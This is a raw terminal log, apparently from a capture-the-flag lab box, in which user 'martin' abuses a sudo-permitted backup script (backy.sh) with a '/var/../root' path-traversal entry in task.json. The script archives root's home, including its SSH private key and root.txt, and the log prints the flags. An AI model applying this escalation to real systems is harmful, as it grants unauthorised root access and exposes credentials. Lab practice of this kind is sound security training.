@@ -1,0 +1,750 @@
+❯ ssh martin@10.10.11.62
+martin@10.10.11.62's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon 31 Mar 2025 08:19:49 PM UTC
+
+  System load:           0.0
+  Usage of /:            52.2% of 5.33GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             233
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.62
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:8aa5
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Mar 31 20:19:53 2025 from 10.10.16.84
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ find /ruta/del/directorio -name "archivo.txt"
+find: ‘/ruta/del/directorio’: No such file or directory
+martin@code:~/backups$ 
+martin@code:~/backups$ find /ruta/del/directorio -name "archivo.txt"martin@code:~/backups$ ls                                           martin@code:~/backups$ ls
+martin@code:~/backups$ ls  
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ lsfind /ruta/del/directorio -name "archivo.txt"martin@code:~/backups$ ls                                           martin@code:~/backups$ ls  
+martin@code:~/backups$ find . -name ""martin@code:~/backups$ find . -namee "" e "" e "" e "" e "" e "" e "" e "" e "" e "" e "" 
+martin@code:~/backups$ e ""
+
+Command 'e' not found, but can be installed with:
+
+apt install e-wrapper
+Please ask your administrator.
+
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$  cd cd  
+martin@code:~$ cd ..
+martin@code:/home$ ls
+app-production  martin
+martin@code:/home$ cd app-production/
+-bash: cd: app-production/: Permission denied
+martin@code:/home$ cd martin/
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ ca    
+martin@code:~/backups$ cat task.json 
+{
+	"destination": "/home/martin/backups/",
+	"multiprocessing": true,
+	"verbose_log": false,
+	"directories_to_archive": [
+		"/home/app-production/app"
+	],
+
+	"exclude": [
+		".*"
+	]
+}
+martin@code:~/backups$ ls
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+tar (child): code_home_app-production_user.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ tar -xjf code_ho    
+tar (child): cod: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ tar -xjf code_home_app-production_app_2024_August.tar.bz2 
+tar (child): code_home_app-production_app_2024_August.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ ls -lh ~/backups
+total 12K
+-rw-r--r-- 1 martin martin 5.8K Mar 31 20:25 code_home_app-production_app_2024_August.tar.bz2
+-rw-r--r-- 1 martin martin  181 Mar 31 20:25 task.json
+martin@code:~/backups$ ls -lh ~/backups | grep "code_home_app"
+-rw-r--r-- 1 martin martin 5.8K Mar 31 20:25 code_home_app-production_app_2024_August.tar.bz2
+martin@code:~/backups$ 
+martin@code:~/backups$ file code_home_app-production_app_2024_August.tar.bz2
+code_home_app-production_app_2024_August.tar.bz2: cannot open `code_home_app-production_app_2024_August.tar.bz2' (No such file or directory)
+martin@code:~/backups$ bzip2 -dv code_home_app-production_app_2024_August.tar.bz2
+bzip2: Can't open input file code_home_app-production_app_2024_August.tar.bz2: No such file or directory.
+martin@code:~/backups$ ls
+martin@code:~/backups$ sudo      
+martin@code:~/backups$ nano    
+na: command not found
+martin@code:~/backups$ ls
+martin@code:~/backups$ ls
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json 
+Error opening terminal: xterm-kitty.
+martin@code:~/backups$ nano task s         
+martin@code:~/backups$ ca  
+ca: command not found
+martin@code:~/backups$ cat task.json 
+{
+	"destination": "/home/martin/backups/",
+	"multiprocessing": true,
+	"verbose_log": false,
+	"directories_to_archive": [
+		"/home/app-production/app"
+	],
+
+	"exclude": [
+		".*"
+	]
+}
+martin@code:~/backups$ u sudo nano task.json 
+[sudo] password for martin: 
+Sorry, try again.
+[sudo] password for martin: 
+Sorry, try again.
+[sudo] password for martin: 
+Sorry, user martin is not allowed to execute '/usr/bin/nano task.json' as root on localhost.
+martin@code:~/backups$ cat /usr/bin/backy.sh
+#!/bin/bash
+
+if [[ $# -ne 1 ]]; then
+    /usr/bin/echo "Usage: $0 <task.json>"
+    exit 1
+fi
+
+json_file="$1"
+
+if [[ ! -f "$json_file" ]]; then
+    /usr/bin/echo "Error: File '$json_file' not found."
+    exit 1
+fi
+
+allowed_paths=("/var/" "/home/")
+
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+
+/usr/bin/echo "$updated_json" > "$json_file"
+
+directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
+
+is_allowed_path() {
+    local path="$1"
+    for allowed_path in "${allowed_paths[@]}"; do
+        if [[ "$path" == $allowed_path* ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+for dir in $directories_to_archive; do
+    if ! is_allowed_path "$dir"; then
+        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
+        exit 1
+    fi
+done
+
+/usr/bin/backy "$json_file"
+martin@code:~/backups$ sudo /usr/bincak    
+[sudo] password for martin: 
+Sorry, try again.
+[sudo] password for martin: 
+sudo: /usr/bi: command not found
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/03/31 20:34:52 🍀 backy 1.2
+2025/03/31 20:34:52 📋 Working with task.json ...
+2025/03/31 20:34:52 💤 Nothing to sync
+2025/03/31 20:34:52 📤 Archiving: [/home/app-production/app]
+2025/03/31 20:34:52 📥 To: /home/martin/backups ...
+2025/03/31 20:34:52 📦
+martin@code:~/backups$ ls
+martin@code:~/backups$ ls
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ cat task.json 
+{
+	"destination": "/home/martin/backups/",
+	"multiprocessing": true,
+	"verbose_log": false,
+	"directories_to_archive": [
+		"/home/app-production/app"
+	],
+
+	"exclude": [
+		".*"
+	]
+}
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+tar (child): code_home_app-production_user.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ touc  h
+
+Command 'toh' not found, did you mean:
+
+  command 'toe' from deb ncurses-bin (6.2-0ubuntu2.1)
+  command 'ptoh' from deb pftools (3+dfsg-3)
+  command 'tth' from deb tth (4.12+ds-2)
+  command 'ctoh' from deb styx (2.0.1-1build1)
+  command 'tox' from deb tox (3.13.2-2)
+  command 'top' from deb procps (2:3.3.16-1ubuntu2.4)
+  command 'tor' from deb tor (0.4.2.7-1)
+
+Try: apt install <deb name>
+
+martin@code:~/backups$ touch task1.json
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task1.json  task.json
+martin@code:~/backups$ nano task1.json 
+Error opening terminal: xterm-kitty.
+martin@code:~/backups$ cat>>     
+martin@code:~/backups$ 
+martin@code:~/backups$ cat {
+cat: '{': No such file or directory
+martin@code:~/backups$ “destination”: “/home/martin/”,
+“destination”:: command not found
+martin@code:~/backups$ “multiprocessing”: true,
+“multiprocessing”:: command not found
+martin@code:~/backups$ “verbose_log”: false,
+“verbose_log”:: command not found
+martin@code:~/backups$ “directories_to_archive”: [
+“directories_to_archive”:: command not found
+martin@code:~/backups$ “/home/app-production/user.txt”
+-bash: “/home/app-production/user.txt”: No such file or directory
+martin@code:~/backups$ ],
+],: command not found
+martin@code:~/backups$ “exclude”: [
+“exclude”:: command not found
+martin@code:~/backups$ “.*”
+“.*”: command not found
+martin@code:~/backups$ ]>>
+-bash: syntax error near unexpected token `newline'
+martin@code:~/backups$ 
+martin@code:~/backups$ ]>>“.*”exclude”: [],          “/home/app-production/user.txt”martin@code:~/backups$ “directories_to_archive”: [    martin@code:~/backups$ “verbose_log”: false,      multiprocessing”: true,destination”: “/home/martin/”,martin@code:~/backups$ cat {                          nano task1.json ls              touch task1.jsonh             ls 
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task1.json  task.json
+martin@code:~/backups$ nano task
+task1.json  task.json   
+martin@code:~/backups$ nano task.json 
+Error opening terminal: xterm-kitty.
+martin@code:~/backups$ rm task
+task1.json  task.json   
+martin@code:~/backups$ rm task1.json 
+martin@code:~/backups$ martin@code:~/backups$ nano task.json 
+-bash: martin@code:~/backups$: No such file or directory
+martin@code:~/backups$ Error opening terminal: xterm-kitty.
+Error: command not found
+martin@code:~/backups$ export TERM=xterm
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json
+martin@code:~/backups$ ls
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/03/31 20:41:43 🍀 backy 1.2
+2025/03/31 20:41:43 📋 Working with task.json ...
+2025/03/31 20:41:43 💤 Nothing to sync
+2025/03/31 20:41:43 📤 Archiving: [/home/app-production/user.txt]
+2025/03/31 20:41:43 📥 To: /home/martin ...
+2025/03/31 20:41:43 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+tar (child): code_home_app-production_user.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ cd ..
+martin@code:~$ ;s
+-bash: syntax error near unexpected token `;'
+martin@code:~$ ls
+backups  code_home_app-production_user.txt_2025_March.tar.bz2
+martin@code:~$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+martin@code:~$ ld
+ld: no input files
+martin@code:~$ ls
+backups  code_home_app-production_user.txt_2025_March.tar.bz2  home
+martin@code:~$ cd home/
+martin@code:~/home$ ls
+app-production
+martin@code:~/home$ cd app-production/
+martin@code:~/home/app-production$ ls
+user.txt
+martin@code:~/home/app-production$ cat user.txt 
+30cc14bf03f407c4d1a199355f40b7f6
+martin@code:~/home/app-production$ ls
+user.txt
+martin@code:~/home/app-production$ cd ..
+martin@code:~/home$ ls
+app-production
+martin@code:~/home$ cd ..
+martin@code:~$ ls
+backups  code_home_app-production_user.txt_2025_March.tar.bz2  home
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/03/31 20:44:16 🍀 backy 1.2
+2025/03/31 20:44:16 📋 Working with task.json ...
+2025/03/31 20:44:16 💤 Nothing to sync
+2025/03/31 20:44:16 📤 Archiving: [/var/../root]
+2025/03/31 20:44:16 📥 To: /home/martin ...
+2025/03/31 20:44:16 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups                                               code_var_.._root_2025_March.tar.bz2
+code_home_app-production_user.txt_2025_March.tar.bz2  home
+martin@code:~$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~$ ls
+backups                                               code_var_.._root_2025_March.tar.bz2
+code_home_app-production_user.txt_2025_March.tar.bz2  home
+martin@code:~$ cd home/
+martin@code:~/home$ ls
+app-production
+martin@code:~/home$ cd app-production/
+martin@code:~/home/app-production$ ls
+user.txt
+martin@code:~/home/app-production$ cd ..
+martin@code:~/home$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd ..
+martin@code:/home$ l
+app-production/  martin/
+martin@code:/home$ cd martin/
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd ..
+martin@code:/home$ ls
+app-production  martin
+martin@code:/home$ cd martin/
+martin@code:~$ sudo /usr/bin/backy.sh task.json
+Error: File 'task.json' not found.
+martin@code:~$ ls
+backups
+martin@code:~$ sudo /usr/bin/backy.sh backups/task.json 
+2025/03/31 20:46:20 🍀 backy 1.2
+2025/03/31 20:46:20 📋 Working with backups/task.json ...
+2025/03/31 20:46:20 💤 Nothing to sync
+2025/03/31 20:46:20 📤 Archiving: [/home/app-production/app]
+2025/03/31 20:46:20 📥 To: /home/martin/backups ...
+2025/03/31 20:46:20 📦
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ;s
+-bash: syntax error near unexpected token `;'
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+code_home_app-production_app_2025_March.tar.bz2
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+tar (child): code_home_app-production_user.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2
+tar (child): code_home_app-production_user.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2024_August.tar.bz2
+tar (child): code_home_app-production_user.txt_2024_August.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+code_home_app-production_app_2025_March.tar.bz2
+martin@code:~/backups$ tar -xjf code_home_app-production_app_2025_March.tar.bz2 
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  home
+code_home_app-production_app_2025_March.tar.bz2   task.json
+martin@code:~/backups$ cd home/
+martin@code:~/backups/home$ ls
+app-production
+martin@code:~/backups/home$ cd app-production/
+martin@code:~/backups/home/app-production$ ls
+app
+martin@code:~/backups/home/app-production$ cd app/
+martin@code:~/backups/home/app-production/app$ ls
+app.py  index.html  instance  __pycache__  static  templates
+martin@code:~/backups/home/app-production/app$ cd instance/
+martin@code:~/backups/home/app-production/app/instance$ ls
+database.db
+martin@code:~/backups/home/app-production/app/instance$ cd ..
+martin@code:~/backups/home/app-production/app$ ls
+app.py  index.html  instance  __pycache__  static  templates
+martin@code:~/backups/home/app-production/app$ cd static/
+martin@code:~/backups/home/app-production/app/static$ ls
+css
+martin@code:~/backups/home/app-production/app/static$ cd ..
+martin@code:~/backups/home/app-production/app$ ls
+app.py  index.html  instance  __pycache__  static  templates
+martin@code:~/backups/home/app-production/app$ cd ..
+martin@code:~/backups/home/app-production$ ls
+app
+martin@code:~/backups/home/app-production$ cd ..
+martin@code:~/backups/home$ ls
+app-production
+martin@code:~/backups/home$ cd ..
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  home
+code_home_app-production_app_2025_March.tar.bz2   task.json
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+Error: File 'task.json' not found.
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+Error: File 'task.json' not found.
+martin@code:~/backups$ ls
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups  task.json
+martin@code:~$ nano task.json 
+martin@code:~$ sudo /usr/bin/backy.sh task.json
+2025/03/31 20:51:15 🍀 backy 1.2
+2025/03/31 20:51:15 📋 Working with task.json ...
+2025/03/31 20:51:15 💤 Nothing to sync
+2025/03/31 20:51:15 📤 Archiving: [/var/../root]
+2025/03/31 20:51:15 📥 To: /home/martin/backups ...
+2025/03/31 20:51:15 📦
+martin@code:~$ ls
+backups  task.json
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups  task.json
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~/backups$ cat root.txt
+cat: root.txt: No such file or directory
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ sudo su
+[sudo] password for martin: 
+Sorry, try again.
+[sudo] password for martin: 
+Sorry, user martin is not allowed to execute '/usr/bin/su' as root on localhost.
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups  task.json
+martin@code:~$ tar -xjf backups/code_home_app-production_app_2024_August.tar.bz2 home/app-production/app/
+home/app-production/app/
+home/app-production/app/app.py
+home/app-production/app/instance/
+home/app-production/app/instance/database.db
+home/app-production/app/static/
+home/app-production/app/static/css/
+home/app-production/app/static/css/styles.css
+home/app-production/app/templates/
+home/app-production/app/templates/about.html
+home/app-production/app/templates/codes.html
+home/app-production/app/templates/index.html
+home/app-production/app/templates/login.html
+home/app-production/app/templates/register.html
+martin@code:~$ tar -xjf backups/code_home_app-production_app_2024_August.tar.bz2 home/app-production/app/
+home/app-production/app/
+home/app-production/app/app.py
+home/app-production/app/instance/
+home/app-production/app/instance/database.db
+home/app-production/app/static/
+home/app-production/app/static/css/
+home/app-production/app/static/css/styles.css
+home/app-production/app/templates/
+home/app-production/app/templates/about.html
+home/app-production/app/templates/codes.html
+home/app-production/app/templates/index.html
+home/app-production/app/templates/login.html
+home/app-production/app/templates/register.html
+martin@code:~$ tar -xjf backups/code_home_app-production_app_2024_August.tar.bz2 home/app-production/app/
+home/app-production/app/
+home/app-production/app/app.py
+home/app-production/app/instance/
+home/app-production/app/instance/database.db
+home/app-production/app/static/
+home/app-production/app/static/css/
+home/app-production/app/static/css/styles.css
+home/app-production/app/templates/
+home/app-production/app/templates/about.html
+home/app-production/app/templates/codes.html
+home/app-production/app/templates/index.html
+home/app-production/app/templates/login.html
+home/app-production/app/templates/register.html
+martin@code:~$ tar -xjf backups/code_home_app-production_app_2024_August.tar.bz2 home/app-production/app/
+home/app-production/app/
+home/app-production/app/app.py
+martin@code:~$ 
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/03/31 20:56:28 🍀 backy 1.2
+2025/03/31 20:56:28 📋 Working with task.json ...
+2025/03/31 20:56:28 💤 Nothing to sync
+2025/03/31 20:56:28 📤 Archiving: [/var/../root]
+2025/03/31 20:56:28 📥 To: /home/martin/backups ...
+2025/03/31 20:56:28 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~/backups$ tar -xjf code_var_…_root_root.txt_2025_March.tar.bz2
+tar (child): code_var_…_root_root.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ cp code_var_.._root_2025_March.tar.bz2  ../
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~$ ls
+backups  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~$ ls
+backups  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_var_.._root_2025_March.tar.bz2
+tar (child): code_var_.._root_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~/backups$ ls
+martin@code:~/backups$ ls
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ nano task.json 
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/03/31 21:02:45 🍀 backy 1.2
+2025/03/31 21:02:45 📋 Working with task.json ...
+2025/03/31 21:02:45 💤 Nothing to sync
+2025/03/31 21:02:45 📤 Archiving: [/var/../root]
+2025/03/31 21:02:45 📥 To: /home/martin ...
+2025/03/31 21:02:45 📦
+tar: Removing leading `/var/../' from member names
+/var/../root/
+/var/../root/.local/
+/var/../root/.local/share/
+/var/../root/.local/share/nano/
+/var/../root/.local/share/nano/search_history
+/var/../root/.sqlite_history
+/var/../root/.profile
+/var/../root/scripts/
+/var/../root/scripts/cleanup.sh
+/var/../root/scripts/backups/
+/var/../root/scripts/backups/task.json
+/var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
+/var/../root/scripts/database.db
+/var/../root/scripts/cleanup2.sh
+/var/../root/.python_history
+/var/../root/root.txt
+/var/../root/.cache/
+/var/../root/.cache/motd.legal-displayed
+/var/../root/.ssh/
+/var/../root/.ssh/id_rsa
+/var/../root/.ssh/authorized_keys
+/var/../root/.bash_history
+/var/../root/.bashrc
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  task.json
+martin@code:~/backups$ cd ..
+martin@code:~$ ls
+backups  code_var_.._root_2025_March.tar.bz2
+martin@code:~$ tar -xjf code_var_…_root_root.txt_2025_March.tar.bz2
+tar (child): code_var_…_root_root.txt_2025_March.tar.bz2: Cannot open: No such file or directory
+tar (child): Error is not recoverable: exiting now
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+martin@code:~$ tar code_var_
+code_var_b  code_var_g  code_var_I  code_var_l  code_var_N  code_var_s  code_var_w  
+code_var_B  code_var_G  code_var_j  code_var_L  code_var_O  code_var_S  code_var_W  
+code_var_C  code_var_h  code_var_J  code_var_m  code_var_p  code_var_T  code_var_X  
+code_var_f  code_var_H  code_var_k  code_var_M  code_var_P  code_var_U  code_var_z  
+code_var_F  code_var_i  code_var_K  code_var_n  code_var_R  code_var_V  code_var_Z  
+martin@code:~$ tar code_var_
+code_var_b  code_var_g  code_var_I  code_var_l  code_var_N  code_var_s  code_var_w  
+code_var_B  code_var_G  code_var_j  code_var_L  code_var_O  code_var_S  code_var_W  
+code_var_C  code_var_h  code_var_J  code_var_m  code_var_p  code_var_T  code_var_X  
+code_var_f  code_var_H  code_var_k  code_var_M  code_var_P  code_var_U  code_var_z  
+code_var_F  code_var_i  code_var_K  code_var_n  code_var_R  code_var_V  code_var_Z  
+martin@code:~$ tar code_var_
+code_var_b  code_var_g  code_var_I  code_var_l  code_var_N  code_var_s  code_var_w  
+code_var_B  code_var_G  code_var_j  code_var_L  code_var_O  code_var_S  code_var_W  
+code_var_C  code_var_h  code_var_J  code_var_m  code_var_p  code_var_T  code_var_X  
+code_var_f  code_var_H  code_var_k  code_var_M  code_var_P  code_var_U  code_var_z  
+code_var_F  code_var_i  code_var_K  code_var_n  code_var_R  code_var_V  code_var_Z  
+martin@code:~$ tar code_var_
+code_var_b  code_var_g  code_var_I  code_var_l  code_var_N  code_var_s  code_var_w  
+code_var_B  code_var_G  code_var_j  code_var_L  code_var_O  code_var_S  code_var_W  
+code_var_C  code_var_h  code_var_J  code_var_m  code_var_p  code_var_T  code_var_X  
+code_var_f  code_var_H  code_var_k  code_var_M  code_var_P  code_var_U  code_var_z  
+code_var_F  code_var_i  code_var_K  code_var_n  code_var_R  code_var_V  code_var_Z  
+martin@code:~$ tar -xjf code_var_.._root_2025_March.tar.bz2 
+martin@code:~$ ls
+backups  code_var_.._root_2025_March.tar.bz2  root
+martin@code:~$ cd root/
+martin@code:~/root$ ls
+root.txt  scripts
+martin@code:~/root$ cat root.txt 
+7fd6321b6b1d127c7bf968b7932b4a98
+martin@code:~/root$ ls
+root.txt  scripts
+martin@code:~/root$ ls
+martin@code:~/root$ cat /usr/
+bin/     include/ lib32/   libexec/ local/   share/   
+games/   lib/     lib64/   libx32/  sbin/    src/     
+martin@code:~/root$ cat /usr/bin/backy.sh
+#!/bin/bash
+
+if [[ $# -ne 1 ]]; then
+    /usr/bin/echo "Usage: $0 <task.json>"
+    exit 1
+fi
+
+json_file="$1"
+
+if [[ ! -f "$json_file" ]]; then
+    /usr/bin/echo "Error: File '$json_file' not found."
+    exit 1
+fi
+
+allowed_paths=("/var/" "/home/")
+
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+
+/usr/bin/echo "$updated_json" > "$json_file"
+
+directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
+
+is_allowed_path() {
+    local path="$1"
+    for allowed_path in "${allowed_paths[@]}"; do
+        if [[ "$path" == $allowed_path* ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+for dir in $directories_to_archive; do
+    if ! is_allowed_path "$dir"; then
+        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
+        exit 1
+    fi
+done
+
+/usr/bin/backy "$json_file"
+martin@code:~/root$ ls
+martin@code:~/root$ ls
+martin@code:~/root$ exit
+logout
+Connection to 10.10.11.62 closed.
+❯ 
+❯ 
+❯ 
+
+
